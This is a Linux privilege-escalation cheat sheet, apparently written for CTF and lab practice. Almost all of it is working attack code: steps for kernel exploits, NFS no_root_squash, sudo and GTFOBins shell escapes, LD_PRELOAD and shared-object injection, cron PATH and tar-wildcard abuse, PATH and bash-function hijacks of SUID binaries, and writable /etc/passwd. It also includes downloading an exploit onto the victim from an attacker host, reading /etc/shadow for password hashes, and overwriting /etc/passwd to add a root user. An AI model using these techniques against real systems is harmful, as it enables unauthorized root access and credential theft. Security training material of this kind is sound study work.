### ***Linux Privilege Escalation Examples***

<details>
<summary>Kernel Exploits</summary>
 <br> 
Step 1: Identify & Search for Exploits
The first step is to identify potential exploits for the target system. You can use Searchsploit to find known vulnerabilities for the specific kernel version.
    
    uname -a #will print the Kernel Version
    searchsploit linux 3.13.0-24
This will list exploits relevant to the kernel version. In this case, the target kernel version is 3.13.0-24.
![image](https://github.com/user-attachments/assets/5629083f-a755-4c84-be78-db0c17a3e6fe)

Step 2: Locate the Exploit
Once you’ve identified a suitable exploit, use the locate command to find its full path and inspect the code.

    locate linux/local/37292.c
    cat /usr/share/exploitdb/exploits/linux/local/37292.c
This shows the contents of the exploit file, which you'll need to compile and execute.
![image](https://github.com/user-attachments/assets/3647680d-156d-453a-9f3b-8adb43c9396f)

Step 3: Check for Compiler and Permissions
Before proceeding with the exploit, ensure the necessary tools and permissions are available on the target system.

Check for GCC: Ensure that the GCC compiler is installed.

    which gcc
Check File Permissions: Verify that you have write permissions to the directory where you’ll save the exploit.

    ls -la
 ![image](https://github.com/user-attachments/assets/22116cd7-9f80-4db0-b85c-2120955a17bc)

Step 4: Copy and Rename the Exploit
Next, copy the exploit code to your Downloads folder and rename it to something like ofs.c.

    sudo cp /usr/share/exploitdb/exploits/linux/local/37292.c /home/kali/Downloads/
    mv 37292.c ofs.c
![image](https://github.com/user-attachments/assets/28fa1d5a-7532-42b9-bd10-1cfbabc9bcfa)

Step 5: Set Up an HTTP Server to Serve the Payload
On your attacker machine, start an HTTP server to serve the payload file (ofs.c) to the victim machine.

    updog -p 80
On the victim machine, use wget to download the exploit:

    wget http://10.6.42.239/ofs.c
![image](https://github.com/user-attachments/assets/b8dc99c8-d633-4f6c-a42c-8273b7f7e63f)

Step 6: Compile the Exploit
Now that the exploit is on the victim’s machine, compile the C code to create the binary that will escalate privileges.

    gcc ofs.c -o ofs
    ./ofs
Step 7: Verify Root Access
Once the exploit runs successfully, you should have root privileges. Verify by checking your user ID with whoami.

    whoami
You should see root, indicating that you’ve escalated to root privileges.
![image](https://github.com/user-attachments/assets/7729b24c-ccb3-49b2-af83-32e608213bcd)

Step 8: Locate the Flag
As a final step, search for the flag file on the system. You can use the following commands to locate and read the flag:

    find / -name flag1.txt 2>/dev/null
    cat /home/matt/flag1.txt
![image](https://github.com/user-attachments/assets/6fd0400a-4cff-4a01-a06d-1640757f4df3)

Summary
Privilege Escalation: This technique involves using kernel exploits to escalate user privileges.

Exploit Search: Use tools like Searchsploit to find relevant vulnerabilities for your target system.

Payload Delivery: Serve the payload using an HTTP server and download it on the target machine.

Compilation and Execution: Compile the C code and run it to gain root access.

Find and Read Flag: After gaining root privileges, locate the flag file to complete the task.


</details>
<details>
<summary>NFS</summary>
 <br> 

NFS allows a host to share file system resources over a network. Access Control is based on the server's file system, and on the uid/gid provided by the connecting client.

Root squashing maps files owned by root (uid 0) to a different ID (e.g. anonymous or nobody). If the "no_root_squash" option is enabled, files owned by root will not get mapped. This means that as long as you access the NFS share as a root (uid 0) user, you can write to the host file system as root.


    $ cat /etc/exports

    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)

On your local machine, check that the NFS share is accessible:


    # showmount -e 10.0.0.1
    Export list for 10.0.0.1:
    /tmp *

On your local machine, make a directory to mount the remote share, and then mount it:


    # mkdir /tmp/mount
    # mount -o rw,vers=2 10.0.0.1:/tmp /tmp/mount
    # ls /tmp/mount
    backup.tar.gz  useless

Create an executable that calls /bin/bash with root level permissions in the mounted share and set the SUID bit:


    int main() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }


    # gcc -o rootsh rootsh.c
    # cp rootsh /tmp/mount
    # chmod +s /tmp/mount/rootsh

Now, back on the remote host, execute the executable to spawn a root shell:


    $ /tmp/rootsh
    #

Alternatively, on the remote host, copy the /bin/bash or /bin/sh binary to the NFS directory:


    $ cp /bin/bash /tmp

On your local machine, after mounting the NFS share, create new copies of the files (or chown them to root) and set the SUID/SGUID bits:


    # cp bash rootbash
    # chmod +s rootbash

    OR

    # chown root:root bash
    # chmod +s bash

Now, back on the remote host, run the file. For bash / sh, use the -p command line option to preserve the SUID/SGID (otherwise shell will simply spawn as your own user).


    $ /tmp/rootbash -p
    #

    OR

    $ /tmp/bash -p
    #
</details>

<details>
<summary>SUDO</summary>
 <br> 

Shell Escape Sequences
----------------------
Check Current Sudo Privileges
To check your current permissions related to sudo, you can use the following command:

    $ sudo -l
This will list the commands a user is allowed to run with sudo privileges. Based on this, an attacker may find a vulnerability to escalate privileges.
If a user has the ability to execute a command with sudo but doesn't have access to everything, we can search for payloads to leverage this.
search for payloads in https://gtfobins.github.io/

Exploit with Sudo
Assuming you can execute find with sudo, you can use the following command to spawn a shell with root privileges:

    sudo find . -exec /bin/sh \; -quit
![image](https://github.com/user-attachments/assets/1d174aff-f610-476e-bb4e-bb3d723280f9)
This command forces find to run a shell (/bin/sh) as root by using sudo. The -quit flag ensures that the find command stops executing immediately after spawning the shell.

Find Common Exploitable Binaries
Some binaries may be configured to allow root access when used with sudo. For example:

nano:
/usr/bin/nano is often a text editor installed on many Linux systems. If a user can run nano with root privileges, they can edit sensitive files, such as /etc/passwd.
![image](https://github.com/user-attachments/assets/e9e7c340-4896-4fe7-afec-00e1eb021b86)


less:
Similarly, less is a pager program, often used to view files. If improperly configured, it may allow privilege escalation:
![image](https://github.com/user-attachments/assets/ab8e392c-17f0-4c1e-be1d-61092cd8d27f)

Find the Flag
After successfully escalating privileges, you can search the system for the flag (or other sensitive files):

    find / -name flag.txt 2>/dev/null
Here, we look for a file called flag.txt and suppress any error messages.
![image](https://github.com/user-attachments/assets/d8883e72-a1a1-4fb4-bd40-dc2c3c781e46)

Find the Hash of Frank's Password
If the password file has been compromised or altered, you can often find hashes of user passwords, including Frank’s password:

      cat /etc/shadow | grep frank
Once you find the hash, you can try cracking it using tools like John the Ripper or Hashcat.
![image](https://github.com/user-attachments/assets/4ba1ec66-b320-40c7-8b8d-0d2d5fe25a1e)


Overwriting Files (Risky)
Warning: This command will overwrite important system files like /etc/passwd — don’t use this in production systems! This is useful only for Capture the Flag (CTF) scenarios or safe environments.

Here’s how you can potentially overwrite the /etc/passwd file to give yourself root access:
*** THIS WILL OVERWRITE THE PASSWD FILE, NOT A GOOD PRACTICE FOR CTF ***

    LFILE=/etc/passwd
    DATA='siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash\n'
    sudo find / -maxdepth 0 -fprintf "$LFILE" "$DATA"
Explanation:

This command creates a new user called siren in the /etc/passwd file with root privileges by adding a new line.

This could allow you to access the system as the siren user with root access. However, remember that overwriting critical system files can be dangerous.
Abusing Intended Functionality
------------------------------


    $ sudo apache2 -f /etc/shadow
    Syntax error on line 1 of /etc/shadow:
    Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::', perhaps misspelled or defined by a module not included in the server configuration

</details>

<details>
<summary>LD_PRELOAD</summary>
 <br> 
Environment variables:

* LD_LIBRARY_PATH - A list of directories in which to search for RLF libraries at execution time.
* LD_PRELOAD - A list of additional, user-specified, ELF shared objects to be loaded before all others.

Sudo has the ability to preserve certain environment variables:


    $ sudo -l
    Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD

Compile a shared object (.so) file:


    #include <stdio.h>
    #include <sys/types.h>
    #include <stdlib.h>

    void _init() {
        unsetenv("LD_PRELOAD");
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }


    $ gcc -fPIC -shared -nostartfiles -o preload.so preload.c

Set the environment variable as part of the sudo command. The full path to the .so file needs to be used. Your user must be able to run the command via sudo.


    $ sudo LD_PRELOAD=/full/path/tp/preload.so apache2
    #
</details>

<details>
<summary>CORN JOB</summary>
 <br> 

Path
----

If PATH variable defined inside a crontab, and one of the paths is writable, and the cron job doesn't refer to an absolute path, we can exploit.


    $ cat /etc/crontab
    SHELL=/bin/sh
    PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    * * * * * root overwrite.sh

In the example above, /home/user is in the PATH and our user can write to it.

Create a /home/user/overwrite.sh script which makes a SUID/SGID bit version of bash:


    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash

Make the script executable:


    $ chmod +x /home/user/overwrite.sh

Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:


    $ /tmp/rootbash -p
    #

Wildcards
---------

If the cron job script contains bash wildcards that reference files, and we can create files in the relevant directory, it may be possible to create files with filenames that can be used as command line flags.


    $ cat /etc/crontab
    ...
    * * * * * root /usr/local/bin/compress.sh


    $ cat /usr/local/bin/compress.sh
    #!/bin/sh
    cd /home/user
    tar czf /tmp/backup.tar.gz *

The tar executable has a checkpoint feature which displays progress messages every specific number of records. It also allows users to define an action that is executed during the checkpoint.

Create a script (runme.sh) which makes a SUID/SGID bit version of bash:


    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash

Make the script executable:


    $ chmod +x runme.sh

Create two files in the directory that the tar command is run in, with the filename set to the full command line options:


    touch /home/user/--checkpoint=1
    touch /home/user/--checkpoint-action=exec=sh\ runme.sh

Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:


    $ /tmp/rootbash -p
    #

File Overwrite
--------------

If a cron job script is writable, we can modify it and run commands as root:


    $ cat /etc/crontab
    ...
    * * * * * root overwrite.sh


    $ locate overwrite.sh
    /usr/local/bin/overwrite.sh
    $ ls -l /usr/local/bin/overwrite.sh
    -rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh

The /usr/local/bin/overwrite.sh file is world-writable.

Overwrite the /usr/local/bin/overwrite.sh script with one that makes a SUID/SGID bit version of bash:


    #!/bin/bash
    cp /bin/bash /tmp/rootbash
    chmod +s /tmp/rootbash

Now wait for the cron job to execute. When it does, execute the /tmp/rootbash binary and get a root shell. Remember to use the -p command line option to preserve the SUID/SGID:


    $ /tmp/rootbash -p
    #

File Permissions
================

Writable /etc/passwd
--------------------

On some \*nix distributions, if /etc/passwd is writable, we can add a new root user with no password, since the only thing that matters is the uid being 0:


    $ echo newroot::0:0:root:/root:/bin/bash >> /etc/passwd

Now use su to switch user:


    $ su newroot
    #


</details>

<details>
<summary>SUID Binaries</summary>
 <br> 
Shared Object Injection
^^^^^^^^^^^^^^^^^^^^^^^

Shared Objects (.so) are the \*nix equivalent of Windows DLLs. If a program references a shared object that we can write to (even if it doesn't exist) we can run commands with the user context of the application.

Find SUID/SGID binaries:


    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwsr-sr-x 1 root root 16664 Feb  9 13:43 /tmp/rootsh
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs

Use strace to find references to shared objects:


    $ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
    access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
    open("/etc/ld.so.cache", O_RDONLY)      = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libdl.so.2", O_RDONLY)       = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libm.so.6", O_RDONLY)        = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
    access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
    open("/lib/libc.so.6", O_RDONLY)        = 3
    open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)

The shared object /home/user/.config/libcalc.so is referenced, but it doesn't exist. Luckily it is in a writable directory.

Create a C program (libcalc.c) and compile it to a shared object:


    #include <stdio.h>
    #include <stdlib.h>

    static void inject() __attribute__((constructor));
    void inject() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }


    $ gcc -shared -fPIC -o libcalc.so libcalc.c

Move the libcalc.so shared object to the path referenced by the SUID binary:


    $ mkdir -p /home/user/.config
    $ cp libcalc.so /home/user/.config/libcalc.so

Now run the SUID binary, it should give you a root shell immediately:


    $ suid-so
    Calculating something, please wait...
    root@debian:~# 

Symlink
^^^^^^^

TODO

Environment Variables - Relative Paths
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Find SUID/SGID binaries:


    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs

Use strings to find any strings in the executable, especially system commands:


    $ strings /usr/local/bin/suid-env
    /lib64/ld-linux-x86-64.so.2
    5q;Xq
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    service apache2 start

The "service" command doesn't have an absolute path. When it is called, \*nix will try to find it by traversing the PATH environment variable. We can modify the PATH variable and create a malicious version of the service binary which will spawn a root shell when it is run.

First create a C program (service.c):


    int main() {
        setresuid(0,0,0);
        setresgid(0,0,0);
        system("/bin/bash");
    }

Compile it to our malicious binary:


    $ gcc -o /tmp/service service.c

Add /tmp to the start of the PATH environment variable and export it:


    $ export PATH=/tmp:$PATH

Now run the original SUID/SGID binary. A root shell should spawn:


    $ /usr/local/bin/suid-env
    #

Environment Variables - Absolute Paths
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

Find SUID/SGID binaries:


    $ find / -type f -a \( -perm -u+s -o -perm -u+s \) -exec ls -l {} \; 2> /dev/null
    -rwxr-sr-x 1 root shadow 19528 Feb 15  2011 /usr/bin/expiry
    -rwxr-sr-x 1 root ssh 108600 Apr  2  2014 /usr/bin/ssh-agent
    -rwsr-xr-x 1 root root 37552 Feb 15  2011 /usr/bin/chsh
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudo
    -rwxr-sr-x 1 root tty 11000 Jun 17  2010 /usr/bin/bsd-write
    -rwxr-sr-x 1 root crontab 35040 Dec 18  2010 /usr/bin/crontab
    -rwsr-xr-x 1 root root 32808 Feb 15  2011 /usr/bin/newgrp
    -rwsr-xr-x 2 root root 168136 Jan  5  2016 /usr/bin/sudoedit
    -rwxr-sr-x 1 root shadow 56976 Feb 15  2011 /usr/bin/chage
    -rwsr-xr-x 1 root root 43280 Feb 15  2011 /usr/bin/passwd
    -rwsr-xr-x 1 root root 60208 Feb 15  2011 /usr/bin/gpasswd
    -rwsr-xr-x 1 root root 39856 Feb 15  2011 /usr/bin/chfn
    -rwxr-sr-x 1 root tty 12000 Jan 25  2011 /usr/bin/wall
    -rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
    -rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env
    -rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
    -rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3
    -rwsr-xr-x 1 root root 6776 Dec 19  2010 /usr/lib/eject/dmcrypt-get-device
    -rwsr-xr-x 1 root root 212128 Apr  2  2014 /usr/lib/openssh/ssh-keysign
    -rwsr-xr-x 1 root root 10592 Feb 15  2016 /usr/lib/pt_chown
    -rwsr-xr-x 1 root root 36640 Oct 14  2010 /bin/ping6
    -rwsr-xr-x 1 root root 34248 Oct 14  2010 /bin/ping
    -rwsr-xr-x 1 root root 78616 Jan 25  2011 /bin/mount
    -rwsr-xr-x 1 root root 34024 Feb 15  2011 /bin/su
    -rwsr-xr-x 1 root root 53648 Jan 25  2011 /bin/umount
    -rwxr-sr-x 1 root shadow 31864 Oct 17  2011 /sbin/unix_chkpwd
    -rwsr-xr-x 1 root root 94992 Dec 13  2014 /sbin/mount.nfs

Use strings to find any strings in the executable, especially system commands:


    $ strings /usr/local/bin/suid-env2
    /lib64/ld-linux-x86-64.so.2
    __gmon_start__
    libc.so.6
    setresgid
    setresuid
    system
    __libc_start_main
    GLIBC_2.2.5
    fff.
    fffff.
    l$ L
    t$(L
    |$0H
    /usr/sbin/service apache2 start

The /usr/sbin/service command seems to be interesting, however it has an absolute path and cannot be edited.

Some versions of Bash (<4.2-048) and Dash let you define functions with the same name as an absolute path. These then take precedent above the actual executable themselves.

Define a bash function "/usr/sbin/service" that creates an SUID/SGID version of bash:


    $ function /usr/sbin/service() { cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p;}

Export the new function:


    $ export -f /usr/sbin/service

Now run the original SUID/SGID binary. A root shell should spawn:


    $ /usr/local/bin/suid-env2
    #

Bash also supports a script debugging mode, and uses the PS4 environment variable to define a prompt for the debugging mode.

We can get an instance root shell:


    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod +s /tmp/rootbash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/rootbash -p'

Startup Scripts
---------------

Startup scripts are stored under /etc/init.d, and are usually run with elevated privileges.

Find world-writable startup scripts:


    $ find /etc/init.d -perm -o+w -type f -exec ls -l {} \; 2>/dev/null
    -rwxr-xrwx 1 root root 801 May 14  2017 /etc/init.d/rc.local

Edit the script and add some code that creates an SUID/SGID bash shell:


    cp /bin/bash /tmp/rootbash
    chown root:root /tmp/rootbash
    chmod +s /tmp/rootbash

Now restart the remote host, and once the host is restarted, spawn a root shell:


    $ /tmp/rootbash -p
    #

Configuration Files
-------------------

Configuration files are usually stored in /etc.

Check writable files to see if we can introduce misconfigurations (e.g. if /etc/exports is writable, we can define NFS shares with root squashing turned off).

##########################
Linux Privilege Escalation
##########################

* https://github.com/mubix/post-exploitation
* https://github.com/spencerdodd/kernelpop
* https://github.com/SecWiki/linux-kernel-exploits
* https://www.google.com/search?q=kernel+exploits
* https://github.com/NullArray/RootHelper
* https://greysec.net/showthread.php?tid=1355
* https://github.com/DominicBreuker/pspy
* https://touhidshaikh.com/blog/?p=790
* http://blog.securelayer7.net/abusing-sudo-advance-linux-privilege-escalation/
* https://gtfobins.github.io/
* https://guif.re/linuxeop
* https://github.com/sagishahar/lpeworkshop
* https://github.com/codingo/OSCP-2
* https://infamoussyn.wordpress.com/2014/07/11/gaining-a-root-shell-using-mysql-user-defined-functions-and-setuid-binaries/
* https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/
* https://docs.ansible.com/ansible/latest/user_guide/become.html
* https://payatu.com/guide-linux-privilege-escalation/
* https://github.com/Arrexel/phpbash
